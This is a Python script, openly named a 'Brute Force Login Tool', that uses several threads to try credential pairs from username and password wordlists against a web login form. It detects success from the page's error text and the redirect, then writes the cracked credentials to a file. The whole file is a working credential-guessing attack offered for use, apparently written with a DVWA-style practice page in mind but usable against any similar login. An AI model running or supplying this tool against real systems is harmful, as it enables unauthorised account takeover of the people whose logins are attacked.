import requests
from bs4 import BeautifulSoup as bs
import threading
import time
import argparse

session = requests.Session()
stop = threading.Event()

def attempt_login(target, username, passwords):
    global var1
    global var2
    
    for password in passwords:
        password = password.strip() 
        login_payload = {
            "username": username,
            "password": password,
            "Login": "Login"
        }
        login_response = session.post(target, data=login_payload, allow_redirects=False)
        soup = bs(login_response.text, 'html.parser')
        error_message = soup.find('p', {'style': 'color: red;'})
        
        if error_message:
            print(f"Login failed for username '{username}' and password '{password}'")
        else:
            current_location = login_response.headers.get("Location")
            if current_location and current_location != "login.php":
                var1 = username
                var2 = password
                with open('log.txt', 'w') as file:
                    file.write(f"Brute Force successful for username '{username}' and password '{password}'")
                stop.set()
                break
    else:
        print(f"All passwords failed for username '{username}'")

def validate(target, num_threads, userlist, passlist):
    with open(userlist, "rt") as user_file:
        usernames = user_file.readlines()

    threads = []
    for username in usernames:
        username = username.strip() 
        with open(passlist, "rt") as passwords:
            passwords = passwords.readlines()
        thread = threading.Thread(target=attempt_login, args=(target, username, passwords))
        thread.start()
        threads.append(thread)
        
        if len(threads) >= num_threads:
            threads[0].join()
            threads.pop(0)
        
        if stop.is_set(): 
            break
        
    for thread in threads:
        thread.join()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Login Tool")
    parser.add_argument("target", type=str, help="Target: example.com, [ipaddress]/login.php")
    parser.add_argument("--userlist", type=str, help="Userlist: userlist.txt")
    parser.add_argument("--passlist", type=str, help="Passwordlist: passwordlist.txt")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads to use (default: 1)")
    args = parser.parse_args()

    if not args.target:
        parser.error("Target is required.")
    else:
        target_url = args.target

    start = time.time()
    validate(target_url, args.threads, args.userlist, args.passlist)  # Perhatikan penggunaan args.passwordlist di sini
    end = time.time()
    elapsed_time = end - start

    print(f"username : {var1}")
    print(f"password : {var2}")
    print(f"Brute force attack completed in {elapsed_time:.2f} seconds.")

    